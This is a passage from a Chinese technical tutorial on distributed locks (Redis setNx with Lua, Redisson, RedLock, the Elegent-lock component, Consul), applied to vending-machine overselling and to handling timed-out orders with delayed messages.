unlockScript.<span class="hljs-title function_">setScriptSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceScriptSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathResource</span>(<span class="hljs-string">"lockDel.lua"</span>)));
 <span class="hljs-comment">// 执行lua脚本解锁</span>
 redisTemplate.<span class="hljs-title function_">execute</span>(unlockScript, <span class="hljs-title class_">Collections</span>.<span class="hljs-title function_">singletonList</span>(keyName), value);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>【知识点小节】</p>
<ol>
<li>如何实现redis分布式锁？</li>
</ol>
<p>（1）我们可以使用Redis的setNx命令加锁，对于我们常用的SpringDataRedis框架来说，可以使用setIfAbsent方法来实现加锁。</p>
<p>（2）这种方式的释放锁不具备原子性，所以我们需要将释放锁的操作放到lua脚本，在代码中调用lua脚本来实现。我们可以使用redisTemplate的execute方法来调用lua脚本。</p>
<h4 data-id="heading-17">3.3.3 Redisson组件封装实现</h4>
<p>因为setNx加锁存在几个弊端：</p>
<p>（1）释放锁调用lua脚本实现稍繁琐</p>
<p>（2）不可重入</p>
<p>（3）没有实现续期</p>
<p>我们使用Redisson组件可以很轻松地解决以上问题。 Redisson组件提供了可重入的，可以实现续期的分布式锁。Redisson组件为你提供了一个“看门狗”机制。</p>
<p>在项目中使用，参考以下步骤：</p>
<p>（1） 引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.redisson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>redisson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.16.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）编写配置类</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Configuration</span>
 <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedissionConfig</span> {
   <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${spring.redis.host}</span>"</span>)</span>
   <span class="hljs-keyword">private</span> String redisHost;

   <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${spring.redis.password}</span>"</span>)</span>
   <span class="hljs-keyword">private</span> String password;

   <span class="hljs-keyword">private</span> int port = <span class="hljs-number">6379</span>;

   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> RedissonClient getRedisson() {
     Config config = new Config();
     config.useSingleServer().
     setAddress(<span class="hljs-string">"redis://"</span> + redisHost + <span class="hljs-string">":"</span> + port).
     setPassword(password);
     <span class="hljs-keyword">return</span> Redisson.create(config);
   }
 }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）加锁和释放锁</p>
<p>引入RedissonClient</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Resource</span>
 <span class="hljs-keyword">private</span> RedissonClient redissonClient;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>通过RLock加锁</p>
<pre><code class="hljs language-ini" lang="ini">RLock <span class="hljs-attr">rLock</span> = redissonClient.getLock(lockName)<span class="hljs-comment">;</span>
 boolean <span class="hljs-attr">isLocked</span> = rLock.tryLock(expireTime, TimeUnit.MILLISECONDS)<span class="hljs-comment">;</span>
 if (isLocked) {
 // TODO： 如果加锁成功 
 }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>通过RLock释放锁</p>
<pre><code class="hljs language-ini" lang="ini">RLock <span class="hljs-attr">rLock</span> = redissonClient.getLock(lockName)<span class="hljs-comment">;</span>
 boolean <span class="hljs-attr">isLocked</span> = rLock.unLock()<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>【知识点小节】</p>
<p>如何使用Redisson组件实现分布式锁？</p>
<p>（1）使用Redisson.create方法创建RedissonClient。</p>
<p>（2）通过redissonClient.getLock方法获取锁对象RLock。</p>
<p>（3）通过调用RLock的tryLock方法加锁</p>
<p>（4）通过调用RLock的unLock方法释放锁</p>
<h4 data-id="heading-18">3.3.4 RedLock算法的实现</h4>
<p>为什么需要使用红锁（RedLock）？</p>
<p>（1）如果我们连接的是一个单节点的Redis，有可能因为Redis宕机导致业务系统瘫痪。</p>
<p>（2）如果我们连接的是一个集群环境，有可能因为脑裂问题导致分布式锁失效。</p>
<p>脑裂 指的是因为网络通讯中断导致一个集群分裂为两个集群的现象。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14fa6fdd04da4eb19a1b7995dc8e8695~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=TyeC928XqPJ9zfkIPCTf98dktW8%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>（3）如果我们使用红锁算法，它所连接的多个节点，并不是一个集群，而是独立的，它的实现原理就是对每个节点依次加锁，超过半数成功，不超过半数失败。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d745924e5134121aa1e180628804aae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=52MpwZnVutZNoFeaNCa0tXUGC40%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>如何使用红锁，我们看代码：</p>
<p>（1） 引入redisson依赖 ，和上边的一样</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.redisson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>redisson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.13.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）编写配置类，这个有些区别</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Configuration</span>
public class RedissionConfig {
  
    <span class="hljs-comment">/**
     * 红锁地址列表
     */</span>
    <span class="hljs-keyword">@Value</span>(<span class="hljs-string">"${elegent.lock.address}"</span>)
    private String[] address;

    <span class="hljs-keyword">@Bean</span>
    public RedissonClient[] getRedisson() {
        <span class="hljs-comment">//初始化</span>
        RedissonClient<span class="hljs-selector-attr">[]</span> redissonClients=new RedissonClient<span class="hljs-selector-attr">[ address.length  ]</span>;
        <span class="hljs-built_in">for</span>(int i=<span class="hljs-number">0</span>;i&lt;redisLockConfig.getAddress()<span class="hljs-selector-class">.length</span>;<span class="hljs-selector-tag">i</span>++){
            Config config = new <span class="hljs-built_in">Config</span>();
            config<span class="hljs-selector-class">.useSingleServer</span>()<span class="hljs-selector-class">.setAddress</span>( "redis://"+redisLockConfig.getAddress()<span class="hljs-selector-attr">[i]</span> );
            redissonClients<span class="hljs-selector-attr">[i]</span> = Redisson<span class="hljs-selector-class">.create</span>(config);
        }
        return redissonClients;
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）加锁和释放锁</p>
<p>先要初始化，假设我们有五个节点</p>
<pre><code class="hljs language-ini" lang="ini">//客户端
    private RedissonClient <span class="hljs-section">[]</span> redissonClients<span class="hljs-comment">;</span>

    @PostConstruct
    public void init() {
        //初始化
        <span class="hljs-attr">redissonClients</span>=new RedissonClient[ address.length  ]<span class="hljs-comment">;</span>
        for(int <span class="hljs-attr">i</span>=<span class="hljs-number">0</span><span class="hljs-comment">;i&lt;redisLockConfig.getAddress().length;i++){</span>
            Config <span class="hljs-attr">config</span> = new Config()<span class="hljs-comment">;</span>
            config.useSingleServer().setAddress( "redis://"+redisLockConfig.getAddress()<span class="hljs-section">[i]</span> )<span class="hljs-comment">;</span>
            redissonClients<span class="hljs-section">[i]</span> = Redisson.create(config)<span class="hljs-comment">;</span>
        }
    }  

   private RedissonRedLock getRedissonRedLock(String lockName){
        RLock <span class="hljs-attr">lock0</span> = redissonClients[<span class="hljs-number">0</span>].getLock(lockName)<span class="hljs-comment">;</span>
        RLock <span class="hljs-attr">lock1</span> = redissonClients[<span class="hljs-number">1</span>].getLock(lockName)<span class="hljs-comment">;</span>
        RLock <span class="hljs-attr">lock2</span> = redissonClients[<span class="hljs-number">2</span>].getLock(lockName)<span class="hljs-comment">;</span>
        RLock <span class="hljs-attr">lock3</span> = redissonClients[<span class="hljs-number">3</span>].getLock(lockName)<span class="hljs-comment">;</span>
        RLock <span class="hljs-attr">lock4</span> = redissonClients[<span class="hljs-number">4</span>].getLock(lockName)<span class="hljs-comment">;</span>
        return new RedissonRedLock(lock0,lock1,lock2,lock3,lock4)<span class="hljs-comment">;</span>
    }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>业务代码中加锁和释放锁</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//红锁</span>
RedissonRedLock redLock=<span class="hljs-built_in">getRedissonRedLock</span>(lockName);  
redLock<span class="hljs-selector-class">.tryLock</span>(<span class="hljs-number">60</span> ,TimeUnit.SECONDS);<span class="hljs-comment">//加锁   参数1是过期时间 ，如果给-1则表示续期</span>
redLock<span class="hljs-selector-class">.unlock</span>();<span class="hljs-comment">//释放锁</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>【知识点小节】</p>
<p>如何使用红锁？</p>
<p>（1）创建每个redis节点的RedissonClient</p>
<p>（2）通过每个redis节点的RedissonClient构建RedissonRedLock 。</p>
<p>（3）通过RedissonRedLock的实例的tryLock加锁，unlock释放锁。</p>
<h3 data-id="heading-19">3.4 Elegent-lock</h3>
<h4 data-id="heading-20">3.4.1 Elegent-lock简介</h4>
<p>这是一个基于springboot的优雅的分布式锁组件。使用这个组件可以让你更轻松、更优雅地在项目中集成分布式锁，让你更专注业务代码的开发。它目前支持redis分布式锁、consul分布式锁两种实现方式，可以通过更改配置自由切换而不需要更改业务代码。</p>
<p>开源项目地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fchuanzhiliubei%2Felegent-lock" title="https://gitee.com/chuanzhiliubei/elegent-lock" target="_blank" ref="nofollow noopener noreferrer">gitee.com/chuanzhiliu…</a></p>
<h4 data-id="heading-21">3.4.2 Elegent-lock快速入门</h4>
<h5 data-id="heading-22">集成</h5>
<p>1.在项目中引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.lock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-lock-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>2.在项目配置文件添加配置，示例如下：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">lock:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">redis</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:6379</span>
    <span class="hljs-attr">wait:</span> <span class="hljs-number">10</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>配置说明：</p>
<p>（1）type: 分布式锁类型，可选值：consul、redis，默认值是redis。</p>
<p>（2）host: 分布式锁中间件的部署地址，默认值为127.0.0.1。</p>
<p>（3）wait: 等待超时时间，单位秒，默认值10。表示在获取不到锁的时候会在此时间内会进行重试。</p>
<h5 data-id="heading-23">代码方式</h5>
<p>类中引入ElegentLock</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> ElegentLock elegentLock;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>方法调用以下方法实现加锁与释放锁</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">//参数说明： 锁名称，过期时间，是否自旋</span>
boolean b = elegentLock.<span class="hljs-keyword">lock</span>(name,<span class="hljs-number">60</span>,<span class="hljs-literal">false</span>);
<span class="hljs-comment">//todo: 业务逻辑</span>
System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"业务逻辑"</span>+b);
elegentLock.unLock(name);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h5 data-id="heading-24">注解方式</h5>
<p>在方法上添加注解<code>@ELegentLock(lockName = "test",isSpin= true,ttl=10)</code> 即可。</p>
<p><code>lockName</code>为锁名字，实际加锁会以<code>lockName</code>+方法参数作为锁key。</p>
<p><code>always =true</code>，加锁，如果锁被占用会通过自旋方式不断尝试，直到加成功为止。</p>
<p><code>always =false</code>，（默认值）加锁，只尝试一次。推荐使用此选项。</p>
<p>我们可以运行Elegent提供的demo代码，进行快速学习。</p>
<h3 data-id="heading-25">3.5 基于Consul分布式锁</h3>
<h4 data-id="heading-26">3.5.1 Consul简介</h4>
<p>Consul是HashiCorp公司推出的开源工具，用于实现分布式系统的服务发现与配置。 Consul是分布式的、高可用的、可横向扩展的。它具备以下特性 :</p>
<p>服务发现：consul通过DNS或者HTTP接口使服务注册和服务发现变的很容易。<br/>
健康检查：健康检测使consul可以快速的告警在集群中的操作。<br/>
键/值存储：一个用来存储动态配置的系统。提供简单的HTTP接口，可以在任何地方操作。<br/>
多数据中心：无需复杂的配置，即可支持任意数量的区域。</p>
<p>一句话概况：</p>
<p>Consul既可以用于注册中心和配置中心，也可以做keyValue存储。使用Consul做分布式锁的底层原理就是keyValue存储。</p>
<p>课程提供了配套的 consul 本地运行环境</p>
<h4 data-id="heading-27">3.5.2 项目为什么使用Consul做分布式锁？</h4>
<p>Consul的分布式锁与Redis分布式锁有什么不同？项目为什么使用Consul做分布式锁？</p>
<p>一句话概况：</p>
<p>因为Consul分布式锁是CP架构的，使用 Raft 算法来保证一致性。相比之下，Redis由于是AP架构，可能因为脑裂造成数据不一致，如果采用Redis红锁性能又很差。所以，当时我们权衡利弊，决定采用Consul分布式锁。</p>
<p>红锁会有弊端。时间复杂度变高（响应时间边长，吞吐量变低） ，空间复杂度变高了。</p>
<h4 data-id="heading-28">3.5.3 Consul做分布式锁快速入门</h4>
<p>修改配置文件 为consul</p>
<h2 data-id="heading-29">4 分布式锁解决超卖问题</h2>
<h3 data-id="heading-30">4.1 问题分析</h3>
<p>首先我们先说为什么会产生超买的问题。</p>
<p>如果售货机是带屏幕的，理论上来说是不会产生超卖问题的。因为带屏幕的售货机实际中就只能是独占类型的操作，但是如果是不带屏幕的售货机，用户就需要扫描售货机上的二维码来进行购买操作， 那么假设有两个用户在相近的时间点在同一台售货机购买了同一个商品， 而恰好这件商品只有一件了，就会可能产生超卖的问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/495f65418e504665afb86a120b5f23b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=jbsfGFIHihZ1vOMVReOhoXiEQzA%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>为什么会超卖呢？我们看一下下面的图：</p>
<p>这是一个用户的购买时序图</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ca6945323e04f18aec825913afc50a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=GnRAZbl8YJxasJJaWO6cnI2VUOA%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>当用户下单时，会判断当前要购买的商品在该售货机的库存，如果当前库存为1件，也是可以下单的，用户这个时候下单并支付，支付成功后，支付系统回调我们的订单微服务，订单微服务向售货机发送出货指令，售货机终端执行出货，并向服务端上报结果，服务端的售货机微服务再扣减库存。这期间其实至少也需几秒左右的时间才能完成。而如果在这期间，另外一个人也着急购买商品，扫描并下单购买同一个商品，那么这个时候第一个人购买的流程还没有结束，库存还没有扣减，所以显示的商品仍然还有一件，那他仍然可以下单。等他支付完成后，售货机没有商品可以出货了，这个时候就产生了超卖。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f68c5d10ad6d4ad0b05f88f19aea71e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=TiN2BJKPmiYAQUf8A1fWk4umJd4%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>这样我们就会产生超卖的现象。</p>
<h3 data-id="heading-31">4.2 实现思路</h3>
<p>那么如何解决超卖现象呢？我们就需要使用分布式锁来解决。</p>
<p>user1在下单前需要加锁，在扣减库存后要释放锁。这样，就确保user2在下单时上一个流程是已经跑完的，此时的库存就是准确的，就不会产生超卖的问题了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d1fc320bf174cacbe4ac0ac47e85d79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=xO5XE%2FScLggA%2BmfHAW3Zf4wLZ7I%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-32">4.3 代码实现</h3>
<h4 data-id="heading-33">4.3.1 订单微服务加锁</h4>
<p>（1）在订单微服务的pom文件引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.lock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-lock-consul<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）在订单微服务的配置（配置中心）中添加以下配置</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">lock:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">consul</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8500</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）在OrderServiceImpl的createOrder方法中添加分布式锁代码：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">ElegentLock</span> eLegentLock;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">OrderEntity</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">PayVO payVO,<span class="hljs-built_in">String</span> platform</span>) {
        <span class="hljs-comment">//判断库存</span>
        <span class="hljs-keyword">if</span>( !vmService.<span class="hljs-title function_">hasCapacity</span>(payVO.<span class="hljs-title function_">getInnerCode</span>(), <span class="hljs-title class_">Long</span>.<span class="hljs-title function_">valueOf</span>(payVO.<span class="hljs-title function_">getSkuId</span>())) ){
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicException</span>(<span class="hljs-string">"商品库存不足"</span>);
        }

        <span class="hljs-comment">//加锁，判断上次交易是否完成</span>
        <span class="hljs-built_in">boolean</span> lock = eLegentLock.<span class="hljs-title function_">lock</span>(payVO.<span class="hljs-title function_">getInnerCode</span>() + <span class="hljs-string">"-"</span> + payVO.<span class="hljs-title function_">getSkuId</span>(), <span class="hljs-number">60</span>, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">if</span>(!lock){
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicException</span>(<span class="hljs-string">"上一笔交易未完成，请稍后！"</span>);
        }
        ..................................
    }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-34">4.3.2 售货机微服务释放锁</h4>
<p>（1）在售货机微服务的pom文件引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.lock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-lock-consul<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）在售货机微服务的配置（配置中心）中添加以下配置</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">lock:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">consul</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8500</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）在VendOutResultHandler的process方法中添加释放分布式锁代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> ElegentLock elegentLock;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(String s,VendoutResultDTO vendoutResultDTO)</span> <span class="hljs-keyword">throws</span> Exception {
    log.info(<span class="hljs-string">"接收到出货结果,{}"</span>, vendoutResultDTO);
    ..........       
    <span class="hljs-comment">//释放锁</span>
    elegentLock.unLock( vendoutResultDTO.getInnerCode()+<span class="hljs-string">"-"</span>+vendoutResultDTO.getSkuId() );
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-35">5.超时订单处理方案-延迟消息</h2>
<h3 data-id="heading-36">5.1 需求分析</h3>
<p>有很多时候，用户下单后，并不一定会支付。如果用户一直不支付，那么这个订单岂不是一直处于未支付状态，这并不利于我们的订单管理，我们通常的做法是设定一个时效，超过这个时间，需要将这个订单更改为无效状态，并且在支付平台将这笔交易关闭掉。</p>
<h3 data-id="heading-37">5.2 实现思路</h3>
<p>（1）在下单时，通过AC框架发送异步消息，延迟时间为5分钟。发送内容为订单号</p>
<p>协议封装: OrderCheck 封装的是订单号</p>
<p>主题封装: TopicConfig.ORDER_CHECK_TOPIC</p>
<p>如果延迟5分钟,前缀为 $delayed/300/</p>
<p>（2）在订单服务中接收延迟消息, 从协议中解析出订单号, 查询订单，如果此订单未支付则修改为无效订单，并关闭此支付交易单。</p>
<h3 data-id="heading-38">5.3 代码实现</h3>
<h4 data-id="heading-39">5.3.1 主题定义与协议封装</h4>
<p>（1）TopicConfig定义延迟订单主题</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">/**
 * 延迟订单主题
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">String</span> ORDER_CHECK_TOPIC = <span class="hljs-string">"server/order/check"</span>;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）service_common定义OrderCheckDTO，用于封装订单号</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">/**
 * 订单延迟检查协议类
 */</span>
@Data
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCheckDTO</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> orderNo;

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-40">5.3.2 发送延迟消息</h4>
<p>OrderServiceImpl引入</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> ElegentAC elegentAC;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>在OrderServiceImpl 的createOrder方法<strong>结尾处</strong>添加以下代码</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//将订单放到延迟队列中，5分钟后检查支付状态！！！！！！！！！！！！！！！！！！</span>
OrderCheckDTO orderCheck = new <span class="hljs-built_in">OrderCheckDTO</span>();
orderCheck<span class="hljs-selector-class">.setOrderNo</span>(orderEntity.getOrderNo());
try {
    elegentAC<span class="hljs-selector-class">.delayPublish</span>(TopicConfig.ORDER_CHECK_TOPIC,orderCheck,<span class="hljs-number">300</span>);
} catch (Exception e) {
    log<span class="hljs-selector-class">.error</span>("send to emq error",e);
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-41">5.3.3 接收延迟消息</h4>
<p>在订单服务项目中实现接收到该消息的处理代码：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 订单超时处理
 */</span>
<span class="hljs-variable">@Topic</span>(TopicConfig.ORDER_CHECK_TOPIC)
<span class="hljs-variable">@Slf4j</span>
public class OrderCheckHandler implements ACHandler&lt;OrderCheckDTO&gt; {

    <span class="hljs-variable">@Autowired</span>
    private OrderService orderService;

    <span class="hljs-variable">@Autowired</span>
    private ElegentPay elegentPay;

    <span class="hljs-variable">@Override</span>
    public void <span class="hljs-built_in">process</span>(String s, OrderCheckDTO orderCheck) throws Exception {

        <span class="hljs-selector-tag">if</span>(orderCheck == null || Strings.<span class="hljs-built_in">isNullOrEmpty</span>(orderCheck.<span class="hljs-built_in">getOrderNo</span>())) <span class="hljs-selector-tag">return</span>;
        <span class="hljs-comment">//查询订单</span>
        <span class="hljs-selector-tag">OrderEntity</span> <span class="hljs-selector-tag">orderEntity</span> = <span class="hljs-selector-tag">orderService</span><span class="hljs-selector-class">.getByOrderNo</span>(orderCheck.<span class="hljs-built_in">getOrderNo</span>());
        <span class="hljs-selector-tag">if</span>(orderEntity == null) <span class="hljs-selector-tag">return</span>;
        <span class="hljs-selector-tag">if</span>(orderEntity.<span class="hljs-built_in">getStatus</span>().<span class="hljs-built_in">equals</span>(OrderStatus.ORDER_STATUS_CREATE)){  <span class="hljs-comment">//如果是未支付</span>
            <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">"订单无效处理 订单号：{}"</span>,orderCheck.<span class="hljs-built_in">getOrderNo</span>());
            <span class="hljs-selector-tag">orderEntity</span><span class="hljs-selector-class">.setStatus</span>(OrderStatus.ORDER_STATUS_INVALID); <span class="hljs-comment">//无效状态</span>
            <span class="hljs-selector-tag">orderService</span><span class="hljs-selector-class">.updateById</span>(orderEntity);
